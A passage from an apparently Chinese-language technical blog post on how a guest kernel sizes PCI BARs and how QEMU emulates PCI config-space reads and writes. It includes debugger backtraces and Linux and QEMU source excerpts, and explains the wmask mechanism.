class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  __pci_read_base (dev=dev@entry=0xffff8881008e1000, type=type@entry=pci_bar_unknown, res=res@entry=0xffff8881008e13a0, pos=pos@entry=16) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:178</span></span><br><span class="line"><span class="comment">//#1  0xffffffff815779e2 in pci_read_bases (rom=&lt;optimized out&gt;, howmany=&lt;optimized out&gt;, dev=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:335</span></span><br><span class="line"><span class="comment">//#2  pci_read_bases (dev=0xffff8881008e1000, howmany=6, rom=48) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:321</span></span><br><span class="line"><span class="comment">//#3  0xffffffff815781e4 in pci_setup_device (dev=dev@entry=0xffff8881008e1000) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:1963</span></span><br><span class="line"><span class="comment">//#4  0xffffffff81578d6a in pci_scan_device (devfn=24, bus=0xffff888100826000) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:2434</span></span><br><span class="line"><span class="comment">//#5  pci_scan_single_device (devfn=24, bus=0xffff888100826000) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:2591</span></span><br><span class="line"><span class="comment">//#6  pci_scan_single_device (bus=0xffff888100826000, devfn=24) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:2581</span></span><br><span class="line"><span class="comment">//#7  0xffffffff81578e33 in pci_scan_slot (bus=bus@entry=0xffff888100826000, devfn=devfn@entry=24) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:2678</span></span><br><span class="line"><span class="comment">//#8  0xffffffff8157a490 in pci_scan_child_bus_extend (bus=bus@entry=0xffff888100826000, available_buses=available_buses@entry=0) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:2897</span></span><br><span class="line"><span class="comment">//#9  0xffffffff8157a68b in pci_scan_child_bus (bus=bus@entry=0xffff888100826000) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:3011</span></span><br><span class="line"><span class="comment">//#10 0xffffffff815bf969 in acpi_pci_root_create (root=root@entry=0xffff888100372700, ops=ops@entry=0xffffffff82c71720 &lt;acpi_pci_root_ops&gt;, info=info@entry=0xffff8881003773c0, sysdata=sysdata@entry=0xffff8881003773f8) at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/pci_root.c:1066</span></span><br><span class="line"><span class="comment">//#11 0xffffffff81eb1285 in pci_acpi_scan_root (root=root@entry=0xffff888100372700) at /home/hawk/Desktop/mqemu/kernel/arch/x86/pci/acpi.c:455</span></span><br><span class="line"><span class="comment">//#12 0xffffffff815bf3f4 in acpi_pci_root_add (device=0xffff88810080a000, not_used=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/pci_root.c:733</span></span><br><span class="line"><span class="comment">//#13 0xffffffff815b4149 in acpi_scan_attach_handler (device=0xffff88810080a000) at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/scan.c:2235</span></span><br><span class="line"><span class="comment">//#14 acpi_bus_attach (device=0xffff88810080a000, first_pass=0x1 &lt;fixed_percpu_data+1&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/scan.c:2282</span></span><br><span class="line"><span class="comment">//#15 0xffffffff818b50c7 in device_for_each_child (parent=parent@entry=0xffff888100809a68, data=data@entry=0xffffc90000013cd8, fn=fn@entry=0xffffffff815b2330 &lt;acpi_dev_for_one_check&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/core.c:4049</span></span><br><span class="line"><span class="comment">//#16 0xffffffff815b2147 in acpi_dev_for_each_child (adev=adev@entry=0xffff888100809800, fn=fn@entry=0xffffffff815b4010 &lt;acpi_bus_attach&gt;, data=data@entry=0x1 &lt;fixed_percpu_data+1&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/bus.c:1138</span></span><br><span class="line"><span class="comment">//#17 0xffffffff815b408f in acpi_bus_attach (device=0xffff888100809800, first_pass=0x1 &lt;fixed_percpu_data+1&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/scan.c:2302</span></span><br><span class="line"><span class="comment">//#18 0xffffffff818b50c7 in device_for_each_child (parent=parent@entry=0xffff888100809268, data=data@entry=0xffffc90000013d70, fn=fn@entry=0xffffffff815b2330 &lt;acpi_dev_for_one_check&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/base/core.c:4049</span></span><br><span class="line"><span class="comment">//#19 0xffffffff815b2147 in acpi_dev_for_each_child (adev=adev@entry=0xffff888100809000, fn=fn@entry=0xffffffff815b4010 &lt;acpi_bus_attach&gt;, data=data@entry=0x1 &lt;fixed_percpu_data+1&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/bus.c:1138</span></span><br><span class="line"><span class="comment">//#20 0xffffffff815b408f in acpi_bus_attach (device=0xffff888100809000, first_pass=first_pass@entry=0x1 &lt;fixed_percpu_data+1&gt;) at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/scan.c:2302</span></span><br><span class="line"><span class="comment">//#21 0xffffffff815b68a7 in acpi_bus_scan (handle=handle@entry=0xffffffffffffffff) at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/scan.c:2583</span></span><br><span class="line"><span class="comment">//#22 0xffffffff832962e4 in acpi_scan_init () at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/scan.c:2718</span></span><br><span class="line"><span class="comment">//#23 0xffffffff83295d3c in acpi_init () at /home/hawk/Desktop/mqemu/kernel/drivers/acpi/bus.c:1443</span></span><br><span class="line"><span class="comment">//#24 0xffffffff81001a63 in do_one_initcall (fn=0xffffffff83295b40 &lt;acpi_init&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1238</span></span><br><span class="line"><span class="comment">//#25 0xffffffff832481d7 in do_initcall_level (command_line=0xffff888100127c00 &quot;rdinit&quot;, level=4) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1300</span></span><br><span class="line"><span class="comment">//#26 do_initcalls () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1316</span></span><br><span class="line"><span class="comment">//#27 do_basic_setup () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1335</span></span><br><span class="line"><span class="comment">//#28 kernel_init_freeable () at /home/hawk/Desktop/mqemu/kernel/init/main.c:1548</span></span><br><span class="line"><span class="comment">//#29 0xffffffff81ee5285 in kernel_init (unused=&lt;optimized out&gt;) at /home/hawk/Desktop/mqemu/kernel/init/main.c:1437</span></span><br><span class="line"><span class="comment">//#30 0xffffffff8103be2f in ret_from_fork (prev=&lt;optimized out&gt;, regs=0xffffc90000013f58, fn=0xffffffff81ee5270 &lt;kernel_init&gt;, fn_arg=0x0 &lt;fixed_percpu_data&gt;) at /home/hawk/Desktop/mqemu/kernel/arch/x86/kernel/process.c:147</span></span><br><span class="line"><span class="comment">//#31 0xffffffff8100244a in ret_from_fork_asm () at /home/hawk/Desktop/mqemu/kernel/arch/x86/entry/entry_64.S:243</span></span><br><span class="line"><span class="comment">//#32 0x0000000000000000 in ?? ()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * __pci_read_base - Read a PCI BAR</span></span><br><span class="line"><span class="comment"> * @dev: the PCI device</span></span><br><span class="line"><span class="comment"> * @type: type of the BAR</span></span><br><span class="line"><span class="comment"> * @res: resource buffer to be filled in</span></span><br><span class="line"><span class="comment"> * @pos: BAR position in the config space</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns 1 if the BAR is 64-bit, or 0 if 32-bit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> __pci_read_base(<span class="keyword">struct</span> pci_dev *dev, <span class="keyword">enum</span> pci_bar_type type,</span><br><span class="line">    <span class="keyword">struct</span> resource *res, <span class="type">unsigned</span> <span class="type">int</span> pos)</span><br><span class="line">&#123;</span><br><span class="line">u32 l = <span class="number">0</span>, sz = <span class="number">0</span>, mask;</span><br><span class="line">u64 l64, sz64, mask64;</span><br><span class="line">u16 orig_cmd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pci_bus_region</span> <span class="title">region</span>, <span class="title">inverted_region</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *res_name = pci_resource_name(dev, res - dev-&gt;resource);</span><br><span class="line"></span><br><span class="line">mask = type ? PCI_ROM_ADDRESS_MASK : ~<span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">pci_read_config_dword(dev, pos, &amp;l);</span><br><span class="line">pci_write_config_dword(dev, pos, l | mask);</span><br><span class="line">pci_read_config_dword(dev, pos, &amp;sz);</span><br><span class="line">pci_write_config_dword(dev, pos, l);</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> (type == pci_bar_unknown) &#123;</span><br><span class="line">res-&gt;flags = decode_bar(dev, l);</span><br><span class="line">res-&gt;flags |= IORESOURCE_SIZEALIGN;</span><br><span class="line"><span class="keyword">if</span> (res-&gt;flags &amp; IORESOURCE_IO) &#123;</span><br><span class="line">l64 = l &amp; PCI_BASE_ADDRESS_IO_MASK;</span><br><span class="line">sz64 = sz &amp; PCI_BASE_ADDRESS_IO_MASK;</span><br><span class="line">mask64 = PCI_BASE_ADDRESS_IO_MASK &amp; (u32)IO_SPACE_LIMIT;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">l64 = l &amp; PCI_BASE_ADDRESS_MEM_MASK;</span><br><span class="line">sz64 = sz &amp; PCI_BASE_ADDRESS_MEM_MASK;</span><br><span class="line">mask64 = (u32)PCI_BASE_ADDRESS_MEM_MASK;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (l &amp; PCI_ROM_ADDRESS_ENABLE)</span><br><span class="line">res-&gt;flags |= IORESOURCE_ROM_ENABLE;</span><br><span class="line">l64 = l &amp; PCI_ROM_ADDRESS_MASK;</span><br><span class="line">sz64 = sz &amp; PCI_ROM_ADDRESS_MASK;</span><br><span class="line">mask64 = PCI_ROM_ADDRESS_MASK;</span><br><span class="line">&#125;</span><br><span class="line">    ...</span><br><span class="line">sz64 = pci_size(l64, sz64, mask64);</span><br><span class="line"><span class="keyword">if</span> (!sz64) &#123;</span><br><span class="line">pci_info(dev, FW_BUG <span class="string">&quot;%s: invalid; can&#x27;t size\n&quot;</span>, res_name);</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">region.start = l64;</span><br><span class="line">region.end = l64 + sz64 - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">pcibios_bus_to_resource(dev-&gt;bus, res, &amp;region);</span><br><span class="line">pcibios_resource_to_bus(dev-&gt;bus, &amp;inverted_region, res);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If &quot;A&quot; is a BAR value (a bus address), &quot;bus_to_resource(A)&quot; is</span></span><br><span class="line"><span class="comment"> * the corresponding resource address (the physical address used by</span></span><br><span class="line"><span class="comment"> * the CPU.  Converting that resource address back to a bus address</span></span><br><span class="line"><span class="comment"> * should yield the original BAR value:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     resource_to_bus(bus_to_resource(A)) == A</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If it doesn&#x27;t, CPU accesses to &quot;bus_to_resource(A)&quot; will not</span></span><br><span class="line"><span class="comment"> * be claimed by the device.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (inverted_region.start != region.start) &#123;</span><br><span class="line">res-&gt;flags |= IORESOURCE_UNSET;</span><br><span class="line">res-&gt;start = <span class="number">0</span>;</span><br><span class="line">res-&gt;end = region.end - region.start;</span><br><span class="line">pci_info(dev, <span class="string">&quot;%s: initial BAR value %#010llx invalid\n&quot;</span>,</span><br><span class="line"> res_name, (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)region.start);</span><br><span class="line">&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，<strong>guest</strong>首先保存当前<strong>BAR</strong>的值，然后将<strong>BAR</strong>所有bit设为1。此时在读取<strong>BAR</strong>的值并将结果保存在<code>sz</code>字段中，最后恢复<strong>BAR</strong>的值。根据<a href="https://members.pcisig.com/wg/PCI-SIG/document/download/8237"><strong>PCI Local Bus Specification Revision 3.0</strong></a>的<strong>6.2.5.1. Address Maps</strong>章节可知，此时通过<code>sz</code>字段即可获取<strong>BAR</strong>空间的大小，如下所示<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; frame </span><br><span class="line"><span class="comment">#0  __pci_read_base (dev=dev@entry=0xffff8881008e1000, type=type@entry=pci_bar_unknown, res=res@entry=0xffff8881008e13a0, pos=pos@entry=16) at /home/hawk/Desktop/mqemu/kernel/drivers/pci/probe.c:201</span></span><br><span class="line">201pci_write_config_dword(dev, pos, l);</span><br><span class="line">pwndbg&gt; p/x (~sz) + 1</span><br><span class="line"><span class="variable">$10</span> = 0x20000</span><br></pre></td></tr></table></figure></p><p>而根据前面<a href="#对象初始化">PCI桥</a>的内容，Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci_host.c#L182"><strong>pci_host_data_write()</strong></a>/<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci_host.c#L191"><strong>pci_host_data_read()</strong></a>来模拟PCI配置空间的访问，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  pci_default_write_config (d=0x5555580d01f0, addr=16, val_in=4294967295, l=4) at ../../qemu/hw/pci/pci.c:1594</span></span><br><span class="line"><span class="comment">//#1  0x0000555555a0f779 in e1000_write_config (pci_dev=0x5555580d01f0, address=16, val=4294967295, len=4) at ../../qemu/hw/net/e1000.c:1629</span></span><br><span class="line"><span class="comment">//#2  0x0000555555a9e85a in pci_host_config_write_common (pci_dev=0x5555580d01f0, addr=16, limit=256, val=4294967295, len=4) at ../../qemu/hw/pci/pci_host.c:96</span></span><br><span class="line"><span class="comment">//#3  0x0000555555a9eaa6 in pci_data_write (s=0x5555574157d0, addr=2147489808, val=4294967295, len=4) at ../../qemu/hw/pci/pci_host.c:138</span></span><br><span class="line"><span class="comment">//#4  0x0000555555a9ec7b in pci_host_data_write (opaque=0x5555573de800, addr=0, val=4294967295, len=4) at ../../qemu/hw/pci/pci_host.c:188</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e19a00 in memory_region_write_accessor (mr=0x5555573dec40, addr=0, value=0x7ffff67ff598, size=4, shift=0, mask=4294967295, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e19d39 in access_with_adjusted_size (addr=0, value=0x7ffff67ff598, size=4, access_size_min=1, access_size_max=4, access_fn=0x555555e19906 &lt;memory_region_write_accessor&gt;, mr=0x5555573dec40, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e1d053 in memory_region_dispatch_write (mr=0x5555573dec40, addr=0, data=4294967295, op=MO_32, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e2b7a0 in flatview_write_continue_step (attrs=..., buf=0x7ffff7f8a000 &quot;\377\377\377\377&quot;, len=4, mr_addr=0, l=0x7ffff67ff680, mr=0x5555573dec40) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e2b870 in flatview_write_continue (fv=0x7ffee8041af0, addr=3324, attrs=..., ptr=0x7ffff7f8a000, len=4, mr_addr=0, l=4, mr=0x5555573dec40) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e2b982 in flatview_write (fv=0x7ffee8041af0, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=4) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e2bdd0 in address_space_write (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=4) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e2be4c in address_space_rw (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=4, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#13 0x0000555555e85476 in kvm_handle_io (port=3324, attrs=..., data=0x7ffff7f8a000, direction=1, size=4, count=1) at ../../qemu/accel/kvm/kvm-all.c:2631</span></span><br><span class="line"><span class="comment">//#14 0x0000555555e85de6 in kvm_cpu_exec (cpu=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-all.c:2903</span></span><br><span class="line"><span class="comment">//#15 0x0000555555e88eb8 in kvm_vcpu_thread_fn (arg=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#16 0x00005555560b2687 in qemu_thread_start (args=0x5555573aa7a0) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#17 0x00007ffff7894ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#18 0x00007ffff7926850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pci_default_read_config</span><span class="params">(PCIDevice *d,</span></span><br><span class="line"><span class="params">                                 <span class="type">uint32_t</span> address, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    assert(address + len &lt;= pci_config_size(d));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pci_is_express_downstream_port(d) &amp;&amp;</span><br><span class="line">        ranges_overlap(address, len, d-&gt;<span class="built_in">exp</span>.exp_cap + PCI_EXP_LNKSTA, <span class="number">2</span>)) &#123;</span><br><span class="line">        pcie_sync_bridge_lnk(d);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;val, d-&gt;config + address, len);</span><br><span class="line">    <span class="keyword">return</span> le32_to_cpu(val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pci_default_write_config</span><span class="params">(PCIDevice *d, <span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val_in, <span class="type">int</span> l)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, was_irq_disabled = pci_irq_disabled(d);</span><br><span class="line">    <span class="type">uint32_t</span> val = val_in;</span><br><span class="line"></span><br><span class="line">    assert(addr + l &lt;= pci_config_size(d));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; l; val &gt;&gt;= <span class="number">8</span>, ++i) &#123;</span><br><span class="line">        <span class="type">uint8_t</span> wmask = d-&gt;wmask[addr + i];</span><br><span class="line">        <span class="type">uint8_t</span> w1cmask = d-&gt;w1cmask[addr + i];</span><br><span class="line">        assert(!(wmask &amp; w1cmask));</span><br><span class="line">        d-&gt;config[addr + i] = (d-&gt;config[addr + i] &amp; ~wmask) | (val &amp; wmask);</span><br><span class="line">        d-&gt;config[addr + i] &amp;= ~(val &amp; w1cmask); <span class="comment">/* W1C: Write 1 to Clear */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ranges_overlap(addr, l, PCI_BASE_ADDRESS_0, <span class="number">24</span>) ||</span><br><span class="line">        ranges_overlap(addr, l, PCI_ROM_ADDRESS, <span class="number">4</span>) ||</span><br><span class="line">        ranges_overlap(addr, l, PCI_ROM_ADDRESS1, <span class="number">4</span>) ||</span><br><span class="line">        range_covers_byte(addr, l, PCI_COMMAND))</span><br><span class="line">        pci_update_mappings(d);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ranges_overlap(addr, l, PCI_COMMAND, <span class="number">2</span>)) &#123;</span><br><span class="line">        pci_update_irq_disabled(d, was_irq_disabled);</span><br><span class="line">        memory_region_set_enabled(&amp;d-&gt;bus_master_enable_region,</span><br><span class="line">                                  (pci_get_word(d-&gt;config + PCI_COMMAND)</span><br><span class="line">                                   &amp; PCI_COMMAND_MASTER) &amp;&amp; d-&gt;has_power);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    msi_write_config(d, addr, val_in, l);</span><br><span class="line">    msix_write_config(d, addr, val_in, l);</span><br><span class="line">    pcie_sriov_config_write(d, addr, val_in, l);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到，Qemu则模拟<strong>BAR</strong>读取时并没有特别的操作，就是将<strong>BAR</strong>数据直接复制出来。因此将<strong>BAR</strong>所有bit置1后读取<strong>BAR</strong>空间大小的交互只能是在写入时实现。这里是通过<strong>wmask</strong>字段实现的，在<strong>PCI设备</strong>实例化时，<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci.c#L1301"><strong>pci_register_bar()</strong></a>同时会设置<strong>wmask</strong>字段为<code>~(size-1)</code>，其确保<code>d-&gt;config[addr + i]</code>的低位始终为0来实现交互的模拟，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pci_default_write_config</span><span class="params">(PCIDevice *d, <span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val_in, <span class="type">int</span> l)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, was_irq_disabled = pci_irq_disabled(d);</span><br><span class="line">    <span class="type">uint32_t</span> val = val_in;</span><br><span class="line"></span><br><span class="line">    assert(addr + l &lt;= pci_config_size(d));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; l; val &gt;&gt;= <span class="number">8</span>, ++i) &#123;</span><br><span class="line">        <span class="type">uint8_t</span> wmask = d-&gt;wmask[addr + i];</span><br><span class="line">        <span class="type">uint8_t</span> w1cmask = d-&gt;w1cmask[addr + i];</span><br><span class="line">        assert(!(wmask &amp; w1cmask));</span><br><span class="line">        d-&gt;config[addr + i] = (d-&gt;config[addr + i] &amp; ~wmask) | (val &amp; wmask);</span><br><span class="line">        d-&gt;config[addr + i] &amp;= ~(val &amp; w1cmask); <span class="comment">/* W1C: Write 1 to Clear */</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pci_register_bar</span><span class="params">(PCIDevice *pci_dev, <span class="type">int</span> region_num,</span></span><br><span class="line"><span class="params">                      <span class="type">uint8_t</span> type, MemoryRegion *memory)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">pcibus_t</span> size = memory_region_size(memory);</span><br><span class="line">    ...</span><br><span class="line">    wmask = ~(size - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (region_num == PCI_ROM_SLOT) &#123;</span><br><span class="line">        <span class="comment">/* ROM enable bit is writable */</span></span><br><span class="line">        wmask |= PCI_ROM_ADDRESS_ENABLE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addr = pci_bar(pci_dev, region_num);</span><br><span class="line">    pci_set_long(pci_dev-&gt;config + addr, type);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(r-&gt;type &amp; PCI_BASE_ADDRESS_SPACE_IO) &amp;&amp;</span><br><span class="line">        r-&gt;type &amp; PCI_BASE_ADDRESS_MEM_TYPE_64) &#123;</span><br><span class="line">        pci_set_quad(pci_dev-&gt;wmask + addr, wmask);</span><br><span class="line">        pci_set_quad(pci_dev-&gt;cmask + addr, ~<span class="number">0ULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        pci_set_long(pci_dev-&gt;wmask + addr, wmask &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">        pci_set_long(pci_dev-&gt;cmask + addr, <span class="number">0xffffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后，<strong>guest</strong>只需要向<strong>BAR</strong>中写入为<strong>BAR</strong>分配的地址空间(是在bios中进行设置而非kernel)，即可完成最终的<strong>BAR</strong>设置，<strong>guest</strong>会使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/pci/pci.c#L1514"><strong>pci_update_mappings()</strong></a>将<strong>BAR</strong>对应的<strong>MemoryRegion</strong>映射入对应的<strong>AddressSpace</strong>中，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 